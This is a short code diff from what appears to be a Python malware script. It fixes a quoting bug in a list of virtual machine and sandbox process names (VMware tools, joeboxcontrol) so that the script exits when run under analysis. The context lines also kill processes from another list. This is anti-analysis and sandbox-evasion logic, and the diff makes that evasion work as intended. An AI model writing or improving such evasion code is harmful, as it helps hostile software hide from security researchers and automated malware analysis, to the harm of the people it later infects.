@@ -27,7 +27,7 @@ for proc in psutil.process_iter():
     if proc.name() in process:
         proc.kill()
 
-vm = ["VMwareService.exe", "VMwareTray.exe","joeboxcontrol.exe,vmwareuser.exe"]
+vm = ["VMwareService.exe", "VMwareTray.exe","joeboxcontrol.exe","vmwareuser.exe"]
 for proc in psutil.process_iter():
         if proc.name() in vm:
             exit()
